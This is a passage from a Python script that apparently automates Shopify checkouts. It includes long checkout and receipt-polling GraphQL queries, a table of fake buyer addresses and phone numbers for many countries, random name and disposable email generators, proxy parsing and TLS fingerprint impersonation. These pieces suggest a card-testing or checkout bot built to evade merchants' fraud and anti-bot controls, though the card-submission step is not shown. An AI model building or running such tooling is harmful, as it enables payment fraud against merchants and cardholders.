__typename}subtotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacySubtotalBeforeTaxesShippingAndFees{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacyAggregatedMerchandiseTermsAsFees{title description total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}legacyRepresentProductsAsFees totalSavings{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}runningTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalTaxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}deferredTotal{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}subtotalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}taxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}dueAt __typename}hasOnlyDeferredShipping subtotalBeforeReductions{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}subtotalAfterMerchandiseDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}duty{...on FilledDutyTerms{totalDutyAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalTaxAndDutyAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalAdditionalFeesAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}tax{...on FilledTaxTerms{totalTaxAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalTaxAndDutyAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalAmountIncludedInTarget{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}exemptions{taxExemptionReason targets{...on TargetAllLines{__typename}__typename}__typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}tip{tipSuggestions{...on TipSuggestion{__typename percentage amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}}__typename}terms{...on FilledTipTerms{tipLines{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}localizationExtension{...on LocalizationExtension{fields{...on LocalizationExtensionField{key title value __typename}__typename}__typename}__typename}landedCostDetails{incotermInformation{incoterm reason __typename}__typename}dutiesIncluded nonNegotiableTerms{signature contents{signature targetTerms targetLine{allLines index __typename}attributes __typename}__typename}optionalDuties{buyerRefusesDuties refuseDutiesPermitted __typename}attribution{attributions{...on RetailAttributions{deviceId locationId userId __typename}...on DraftOrderAttributions{userIdentifier:userId sourceName locationIdentifier:locationId __typename}__typename}__typename}saleAttributions{attributions{...on SaleAttribution{recipient{...on StaffMember{id __typename}...on Location{id __typename}...on PointOfSaleDevice{id __typename}__typename}targetMerchandiseLines{...FilledMerchandiseLineTargetCollectionFragment...on AnyMerchandiseLineTargetCollection{any __typename}__typename}__typename}__typename}__typename}managedByMarketsPro captcha{...on Captcha{provider challenge sitekey token __typename}...on PendingTerms{taskId pollDelay __typename}__typename}cartCheckoutValidation{...on PendingTerms{taskId pollDelay __typename}__typename}alternativePaymentCurrency{...on AllocatedAlternativePaymentCurrencyTotal{total{amount currencyCode __typename}paymentLineAllocations{amount{amount currencyCode __typename}stableId __typename}__typename}__typename}isShippingRequired __typename}fragment ProposalDeliveryExpectationFragment on DeliveryExpectationTerms{__typename...on FilledDeliveryExpectationTerms{deliveryExpectations{minDeliveryDateTime maxDeliveryDateTime deliveryStrategyHandle brandedPromise{logoUrl darkThemeLogoUrl lightThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name handle __typename}deliveryOptionHandle deliveryExpectationPresentmentTitle{short long __typename}promiseProviderApiClientId signedHandle returnability __typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}}fragment ProposalMembershipsFragment on MembershipTerms{__typename...on FilledMembershipTerms{memberships{apply handle __typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{_singleInstance __typename}}fragment RedeemablePaymentMethodFragment on RedeemablePaymentMethod{redemptionSource redemptionContent{...on ShopCashRedemptionContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}__typename}redemptionPaymentOptionKind redemptionId destinationAmount{amount currencyCode __typename}sourceAmount{amount currencyCode __typename}details{redemptionId sourceAmount{amount currencyCode __typename}destinationAmount{amount currencyCode __typename}redemptionType __typename}__typename}...on StoreCreditRedemptionContent{storeCreditAccountId __typename}...on CustomRedemptionContent{redemptionAttributes{key value __typename}maskedIdentifier paymentMethodIdentifier __typename}__typename}__typename}fragment UiExtensionInstallationFragment on UiExtensionInstallation{extension{approvalScopes{handle __typename}capabilities{apiAccess networkAccess blockProgress collectBuyerConsent{smsMarketing customerPrivacy __typename}__typename}apiVersion appId appUrl preloads{target namespace value __typename}appName extensionLocale extensionPoints name registrationUuid scriptUrl translations uuid version __typename}__typename}fragment CustomerCreditCardPaymentMethodFragment on CustomerCreditCardPaymentMethod{id cvvSessionId paymentMethodIdentifier token displayLastDigits brand defaultPaymentMethod deletable requiresCvvConfirmation firstDigits billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}fragment PaypalBillingAgreementPaymentMethodFragment on PaypalBillingAgreementPaymentMethod{paymentMethodIdentifier token billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}fragment PaymentLines on PaymentLine{stableId specialInstructions amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}dueAt due{...on PaymentLineDueEvent{event __typename}...on PaymentLineDueTime{time __typename}__typename}paymentMethod{...on DirectPaymentMethod{sessionId paymentMethodIdentifier creditCard{...on CreditCard{brand lastDigits name __typename}__typename}paymentAttributes __typename}...on GiftCardPaymentMethod{code balance{amount currencyCode __typename}__typename}...on RedeemablePaymentMethod{...RedeemablePaymentMethodFragment __typename}...on WalletsPlatformPaymentMethod{name walletParams __typename}...on WalletPaymentMethod{name walletContent{...on ShopPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}sessionToken paymentMethodIdentifier __typename}...on PaypalWalletContent{paypalBillingAddress:billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}email payerId token paymentMethodIdentifier acceptedSubscriptionTerms expiresAt merchantId __typename}...on ApplePayWalletContent{data signature version lastDigits paymentMethodIdentifier header{applicationData ephemeralPublicKey publicKeyHash transactionId __typename}__typename}...on GooglePayWalletContent{signature signedMessage protocolVersion paymentMethodIdentifier __typename}...on ShopifyInstallmentsWalletContent{autoPayEnabled billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}disclosureDetails{evidence id type __typename}installmentsToken sessionToken paymentMethodIdentifier __typename}__typename}__typename}...on LocalPaymentMethod{paymentMethodIdentifier name __typename}...on PaymentOnDeliveryMethod{additionalDetails paymentInstructions paymentMethodIdentifier __typename}...on OffsitePaymentMethod{paymentMethodIdentifier name __typename}...on CustomPaymentMethod{id name additionalDetails paymentInstructions paymentMethodIdentifier __typename}...on CustomOnsitePaymentMethod{paymentMethodIdentifier name paymentAttributes __typename}...on ManualPaymentMethod{id name paymentMethodIdentifier __typename}...on DeferredPaymentMethod{orderingIndex displayName __typename}...on CustomerCreditCardPaymentMethod{...CustomerCreditCardPaymentMethodFragment __typename}...on PaypalBillingAgreementPaymentMethod{...PaypalBillingAgreementPaymentMethodFragment __typename}...on NoopPaymentMethod{__typename}__typename}__typename}"""

QUERY_POLL = """query PollForReceipt($receiptId:ID!,$sessionToken:String!){receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken}){...ReceiptDetails __typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token redirectUrl confirmationPage{url shouldRedirect __typename}orderStatusPageUrl shopPay shopPayInstallments paymentExtensionBrand analytics{checkoutCompletedEventId emitConversionEvent __typename}poNumber orderIdentity{buyerIdentifier id __typename}customerId isFirstOrder eligibleForMarketingOptIn purchaseOrder{...ReceiptPurchaseOrder __typename}orderCreationStatus{__typename}paymentDetails{paymentCardBrand creditCardLastFourDigits paymentAmount{amount currencyCode __typename}paymentGateway financialPendingReason paymentDescriptor buyerActionInfo{...on MultibancoBuyerActionInfo{entity reference __typename}__typename}__typename}shopAppLinksAndResources{mobileUrl qrCodeUrl canTrackOrderUpdates shopInstallmentsViewSchedules shopInstallmentsMobileUrl installmentsHighlightEligible mobileUrlAttributionPayload shopAppEligible shopAppQrCodeKillswitch shopPayOrder payEscrowMayExist buyerHasShopApp buyerHasShopPay orderUpdateOptions __typename}postPurchasePageUrl postPurchasePageRequested postPurchaseVaultedPaymentMethodStatus paymentFlexibilityPaymentTermsTemplate{__typename dueDate dueInDays id translatedName type}__typename}...on ProcessingReceipt{id purchaseOrder{...ReceiptPurchaseOrder __typename}pollDelay __typename}...on WaitingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id action{...on CompletePaymentChallenge{offsiteRedirect url __typename}...on CompletePaymentChallengeV2{challengeType challengeData __typename}__typename}timeout{millisecondsRemaining __typename}__typename}...on FailedReceipt{id processingError{...on InventoryClaimFailure{__typename}...on InventoryReservationFailure{__typename}...on OrderCreationFailure{paymentsHaveBeenReverted __typename}...on OrderCreationSchedulingFailure{__typename}...on PaymentFailed{code messageUntranslated hasOffsitePaymentMethod __typename}...on DiscountUsageLimitExceededFailure{__typename}...on CustomerPersistenceFailure{__typename}__typename}__typename}__typename}fragment ReceiptPurchaseOrder on PurchaseOrder{__typename sessionToken totalAmountToPay{amount currencyCode __typename}checkoutCompletionTarget delivery{...on PurchaseOrderDeliveryTerms{splitShippingToggle deliveryLines{__typename availableOn deliveryStrategy{handle title description methodType brandedPromise{handle logoUrl lightThemeLogoUrl darkThemeLogoUrl lightThemeCompactLogoUrl darkThemeCompactLogoUrl name __typename}pickupLocation{...on PickupInStoreLocation{name address{address1 address2 city countryCode zoneCode postalCode phone coordinates{latitude longitude __typename}__typename}instructions __typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}carrierCode carrierName name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}deliveryPromisePresentmentTitle{short long __typename}deliveryStrategyBreakdown{__typename amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice flatRateGroupId targetMerchandise{...on PurchaseOrderMerchandiseLine{stableId quantity{...on PurchaseOrderMerchandiseQuantityByItem{items __typename}__typename}merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}legacyFee __typename}...on PurchaseOrderBundleLineComponent{stableId quantity merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}__typename}}__typename}lineAmount{amount currencyCode __typename}lineAmountAfterDiscounts{amount currencyCode __typename}destinationAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}__typename}groupType targetMerchandise{...on PurchaseOrderMerchandiseLine{stableId quantity{...on PurchaseOrderMerchandiseQuantityByItem{items __typename}__typename}merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}legacyFee __typename}...on PurchaseOrderBundleLineComponent{stableId quantity merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}__typename}}__typename}__typename}deliveryExpectations{__typename brandedPromise{name logoUrl handle lightThemeLogoUrl darkThemeLogoUrl __typename}deliveryStrategyHandle deliveryExpectationPresentmentTitle{short long __typename}returnability{returnable __typename}}payment{...on PurchaseOrderPaymentTerms{billingAddress{__typename...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}}paymentLines{amount{amount currencyCode __typename}postPaymentMessage dueAt due{...on PaymentLineDueEvent{event __typename}...on PaymentLineDueTime{time __typename}__typename}paymentMethod{...on DirectPaymentMethod{sessionId paymentMethodIdentifier vaultingAgreement creditCard{brand lastDigits __typename}billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on CustomerCreditCardPaymentMethod{id brand displayLastDigits token deletable defaultPaymentMethod requiresCvvConfirmation firstDigits billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}...on PurchaseOrderGiftCardPaymentMethod{balance{amount currencyCode __typename}code __typename}...on WalletPaymentMethod{name walletContent{...on ShopPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}sessionToken paymentMethodIdentifier paymentMethod paymentAttributes __typename}...on PaypalWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}email payerId token expiresAt __typename}...on ApplePayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}data signature version __typename}...on GooglePayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}signature signedMessage protocolVersion __typename}...on ShopifyInstallmentsWalletContent{autoPayEnabled billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}disclosureDetails{evidence id type __typename}installmentsToken sessionToken creditCard{brand lastDigits __typename}__typename}__typename}__typename}...on WalletsPlatformPaymentMethod{name walletParams __typename}...on LocalPaymentMethod{paymentMethodIdentifier name displayName billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on PaymentOnDeliveryMethod{additionalDetails paymentInstructions paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on OffsitePaymentMethod{paymentMethodIdentifier name billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on ManualPaymentMethod{additionalDetails name paymentInstructions id paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on CustomPaymentMethod{additionalDetails name paymentInstructions id paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on DeferredPaymentMethod{orderingIndex displayName __typename}...on PaypalBillingAgreementPaymentMethod{token billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}...on RedeemablePaymentMethod{redemptionSource redemptionContent{...on ShopCashRedemptionContent{redemptionPaymentOptionKind billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}__typename}redemptionId details{redemptionId sourceAmount{amount currencyCode __typename}destinationAmount{amount currencyCode __typename}redemptionType __typename}__typename}...on CustomRedemptionContent{redemptionAttributes{key value __typename}maskedIdentifier paymentMethodIdentifier __typename}...on StoreCreditRedemptionContent{storeCreditAccountId __typename}__typename}__typename}...on CustomOnsitePaymentMethod{paymentMethodIdentifier name __typename}__typename}__typename}__typename}__typename}buyerIdentity{...on PurchaseOrderBuyerIdentityTerms{contactMethod{...on PurchaseOrderEmailContactMethod{email __typename}...on PurchaseOrderSMSContactMethod{phoneNumber __typename}__typename}marketingConsent{...on PurchaseOrderEmailContactMethod{email __typename}...on PurchaseOrderSMSContactMethod{phoneNumber __typename}__typename}__typename}customer{__typename...on GuestProfile{presentmentCurrency countryCode market{id handle __typename}__typename}...on DecodedCustomerProfile{id presentmentCurrency fullName firstName lastName countryCode email imageUrl acceptsSmsMarketing acceptsEmailMarketing ordersCount phone __typename}...on BusinessCustomerProfile{checkoutExperienceConfiguration{editableShippingAddress __typename}id presentmentCurrency fullName firstName lastName acceptsSmsMarketing acceptsEmailMarketing countryCode imageUrl email ordersCount phone market{id handle __typename}__typename}}purchasingCompany{company{id externalId name __typename}contact{locationCount __typename}location{id externalId name __typename}__typename}__typename}merchandise{taxesIncluded merchandiseLines{stableId legacyFee merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}lineComponents{...PurchaseOrderBundleLineComponent __typename}quantity{__typename...on PurchaseOrderMerchandiseQuantityByItem{items __typename}}recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}lineAmount{__typename amount currencyCode}__typename}__typename}tax{totalTaxAmountV2{__typename amount currencyCode}totalDutyAmount{amount currencyCode __typename}totalTaxAndDutyAmount{amount currencyCode __typename}totalAmountIncludedInTarget{amount currencyCode __typename}__typename}discounts{lines{...PurchaseOrderDiscountLineFragment __typename}__typename}legacyRepresentProductsAsFees totalSavings{amount currencyCode __typename}subtotalBeforeTaxesAndShipping{amount currencyCode __typename}legacySubtotalBeforeTaxesShippingAndFees{amount currencyCode __typename}legacyAggregatedMerchandiseTermsAsFees{title description total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}landedCostDetails{incotermInformation{incoterm reason __typename}__typename}optionalDuties{buyerRefusesDuties refuseDutiesPermitted __typename}dutiesIncluded tip{tipLines{amount{amount currencyCode __typename}__typename}__typename}hasOnlyDeferredShipping note{customAttributes{key value __typename}message __typename}shopPayArtifact{optIn{vaultPhone __typename}__typename}recurringTotals{fixedPrice{amount currencyCode __typename}fixedPriceCount interval intervalCount recurringPrice{amount currencyCode __typename}title __typename}checkoutTotalBeforeTaxesAndShipping{__typename amount currencyCode}checkoutTotal{__typename amount currencyCode}checkoutTotalTaxes{__typename amount currencyCode}subtotalBeforeReductions{__typename amount currencyCode}subtotalAfterMerchandiseDiscounts{__typename amount currencyCode}deferredTotal{amount{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}dueAt subtotalAmount{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}taxes{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}__typename}metafields{key namespace value valueType:type __typename}}fragment ProductVariantSnapshotMerchandiseDetails on ProductVariantSnapshot{variantId options{name value __typename}productTitle title productUrl untranslatedTitle untranslatedSubtitle sellingPlan{name id digest deliveriesPerBillingCycle prepaid subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}deferredAmount{amount currencyCode __typename}digest giftCard image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}price{amount currencyCode __typename}productId productType properties{...MerchandiseProperties __typename}requiresShipping sku taxCode taxable vendor weight{unit value __typename}__typename}fragment MerchandiseProperties on MerchandiseProperty{name value{...on MerchandisePropertyValueString{string:value __typename}...on MerchandisePropertyValueInt{int:value __typename}...on MerchandisePropertyValueFloat{float:value __typename}...on MerchandisePropertyValueBoolean{boolean:value __typename}...on MerchandisePropertyValueJson{json:value __typename}__typename}visible __typename}fragment DiscountDetailsFragment on Discount{...on CustomDiscount{title description presentationLevel allocationMethod targetSelection targetType signature signatureUuid type value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}...on CodeDiscount{title code presentationLevel allocationMethod message targetSelection targetType value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}...on DiscountCodeTrigger{code __typename}...on AutomaticDiscount{presentationLevel title allocationMethod message targetSelection targetType value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}fragment PurchaseOrderBundleLineComponent on PurchaseOrderBundleLineComponent{stableId merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}quantity recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}totalAmount{__typename amount currencyCode}__typename}fragment PurchaseOrderDiscountLineFragment on PurchaseOrderDiscountLine{discount{...DiscountDetailsFragment __typename}lineAmount{amount currencyCode __typename}deliveryAllocations{amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index stableId targetType __typename}merchandiseAllocations{amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index stableId targetType __typename}__typename}"""

# Legacy aliases for backward compatibility
QUERY_PROPOSAL_SHIPPING = QUERY_PROPOSAL
QUERY_PROPOSAL_DELIVERY = QUERY_PROPOSAL


# ──────────────────────────────────────────────────────────────
# SSL CONTEXT: Use selective SSL verification instead of blanket ssl=False
# ──────────────────────────────────────────────────────────────
# SSL context and connector functions removed — tls-requests handles TLS/SSL
# via the client_identifier parameter. No need to manually create SSL contexts.

C2C = {
    "USD": "US",
    "CAD": "CA", 
    "INR": "IN",
    "AED": "AE",
    "HKD": "HK",
    "GBP": "GB",
    "EUR": "DE",
    "AUD": "AU",
    "CHF": "CH",
    # TLD-to-currency mappings for common country TLDs
    "UK": "GB",  # .co.uk TLD maps to GB country
    "DE": "DE",
    "FR": "FR",
    "JP": "JP",
}

# TLD-to-country-code mapping for common Shopify TLDs
_TLD_TO_COUNTRY = {
    "UK": "GB",   # .co.uk → Great Britain
    "AU": "AU",   # .com.au → Australia  
    "CA": "CA",   # .ca → Canada
    "IN": "IN",   # .in → India
    "DE": "DE",   # .de → Germany
    "FR": "FR",   # .fr → France
    "JP": "JP",   # .co.jp → Japan
    "NL": "NL",   # .nl → Netherlands
    "US": "US",   # .com → US (fallback)
    "COM": "US",  # .com default
    "ORG": "US",  # .org default
    "NET": "US",  # .net default
}

book = {
    "US": {"address1": "123 Main", "city": "NY", "postalCode": "10080", "zoneCode": "NY", "countryCode": "US", "phone": "2194157586", "currencyCode": "USD"},
    "CA": {"address1": "88 Queen", "city": "Toronto", "postalCode": "M5J2J3", "zoneCode": "ON", "countryCode": "CA", "phone": "4165550198", "currencyCode": "CAD"},
    "GB": {"address1": "221B Baker Street", "city": "London", "postalCode": "NW1 6XE", "zoneCode": "LND", "countryCode": "GB", "phone": "2079460123", "currencyCode": "USD"},
    "UK": {"address1": "221B Baker Street", "city": "London", "postalCode": "NW1 6XE", "zoneCode": "LND", "countryCode": "GB", "phone": "2079460123", "currencyCode": "USD"},
    "DE": {"address1": "Friedrichstrasse 45", "city": "Berlin", "postalCode": "10117", "zoneCode": "BE", "countryCode": "DE", "phone": "4930123456", "currencyCode": "EUR"},
    "FR": {"address1": "12 Rue de Rivoli", "city": "Paris", "postalCode": "75001", "zoneCode": "IDF", "countryCode": "FR", "phone": "3312345678", "currencyCode": "EUR"},
    "AU": {"address1": "1 Martin Place", "city": "Sydney", "postalCode": "2000", "zoneCode": "NSW", "countryCode": "AU", "phone": "291234567", "currencyCode": "AUD"},
    "IN": {"address1": "221B MG", "city": "Mumbai", "postalCode": "400001", "zoneCode": "MH", "countryCode": "IN", "phone": "9876543210", "currencyCode": "INR"},
    "AE": {"address1": "Burj Tower", "city": "Dubai", "postalCode": "", "zoneCode": "DU", "countryCode": "AE", "phone": "501234567", "currencyCode": "AED"},
    "HK": {"address1": "Nathan 88", "city": "Kowloon", "postalCode": "", "zoneCode": "KL", "countryCode": "HK", "phone": "55555555", "currencyCode": "HKD"},
    "CN": {"address1": "8 Zhongguancun Street", "city": "Beijing", "postalCode": "100080", "zoneCode": "BJ", "countryCode": "CN", "phone": "1062512345", "currencyCode": "USD"},
    "CH": {"address1": "Gotthardstrasse 17", "city": "Schweiz", "postalCode": "6430", "zoneCode": "SZ", "countryCode": "CH", "phone": "445512345", "currencyCode": "CHF"},
    "JP": {"address1": "1-1-1 Chiyoda", "city": "Tokyo", "postalCode": "100-8111", "zoneCode": "13", "countryCode": "JP", "phone": "0312345678", "currencyCode": "USD"},
    "SI": {"address1": "Slovenska cesta 50", "city": "Ljubljana", "postalCode": "1000", "zoneCode": "LJ", "countryCode": "SI", "phone": "38621984156", "currencyCode": "USD"},
    "DEFAULT": {"address1": "123 Main", "city": "New York", "postalCode": "10080", "zoneCode": "NY", "countryCode": "US", "phone": "2194157586", "currencyCode": "USD"},
}

def pick_addr(url, cc=None, rc=None):
    """Select address from book based on URL TLD, currency code, or region code.
    
    Priority:
    1. Direct TLD match in book (e.g. .ca → CA)
    2. TLD mapped via _TLD_TO_COUNTRY (e.g. .uk → GB, .com → US)
    3. Currency code (cc) mapped via C2C (e.g. GBP → GB)
    4. Region code (rc) direct match in book
    5. DEFAULT (US)
    """
    cc = (cc or "").upper()
    rc = (rc or "").upper()
    dom = urlparse(url).netloc
    tcn = dom.split('.')[-1].upper()

    # Direct TLD match in book (e.g. .ca → "CA" in book)
    if tcn in book:
        return book[tcn]

    # TLD mapped to country code (e.g. "UK" → "GB", "COM" → "US")
    tld_country = _TLD_TO_COUNTRY.get(tcn)
    if tld_country and tld_country in book:
        return book[tld_country]

    # Currency code to country mapping (e.g. GBP → GB)
    ccn = C2C.get(cc)
    if ccn and ccn in book:
        return book[ccn]

    # Region code direct match
    if rc in book:
        return book[rc]

    return book["DEFAULT"]

def extract_between(text, start, end):
    if not text or not start or not end:
        return None
    try:
        if start in text:
            parts = text.split(start, 1)
            if len(parts) > 1:
                if end in parts[1]:
                    result = parts[1].split(end, 1)[0]
                    return result if result else None
        return None
    except Exception:
        return None

class Utils:
    @staticmethod
    def get_random_name():
        first_names = ["James", "John", "Robert", "Michael", "William", "David", "Mary", "Patricia", "Jennifer", "Linda"]
        last_names = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Rodriguez"]
        return (random.choice(first_names), random.choice(last_names))
    
    @staticmethod
    def generate_email(first, last):
        domains = ["gmail.com", "yahoo.com", "outlook.com", "protonmail.com"]
        return f"{first.lower()}.{last.lower()}{random.randint(100,9999)}@{random.choice(domains)}"

def parse_proxy(proxy_str):
    """Parse proxy string into tls-requests/aiohttp-compatible URL.
    
    Supported formats:
      - ip:port                          → http://ip:port
      - ip:port:user:pass                → http://user:pass@ip:port
      - [::1]:port                       → http://[::1]:port
      - [::1]:port:user:pass             → http://user:pass@[::1]:port
      - http://ip:port                   → http://ip:port
      - http://user:pass@ip:port         → http://user:pass@ip:port
      - socks5://ip:port                 → socks5://ip:port
      - socks5://user:pass@ip:port       → socks5://user:pass@ip:port
      - user:pass@ip:port                → http://user:pass@ip:port
    """
    if not proxy_str:
        return None
    
    proxy_str = proxy_str.strip()
    
    # Already a full URL (http://, https://, socks5://, socks4://)
    if proxy_str.startswith(('http://', 'https://', 'socks5://', 'socks4://', 'socks5h://')):
        return proxy_str
    
    # Format: user:pass@ip:port or user:pass@[::1]:port
    if '@' in proxy_str:
        auth_part, host_part = proxy_str.rsplit('@', 1)
        # Validate host:port (works for both IPv4 and [IPv6]:port)
        if host_part.startswith('['):
            # IPv6 bracket notation: [::1]:port
            bracket_end = host_part.find(']')
            if bracket_end != -1 and bracket_end + 1 < len(host_part) and host_part[bracket_end + 1] == ':':
                return f"http://{auth_part}@{host_part}"
        elif ':' in host_part:
            return f"http://{auth_part}@{host_part}"
        return None
    
    # IPv6 bracket format without auth: [::1]:port
    if proxy_str.startswith('['):
        bracket_end = proxy_str.find(']')
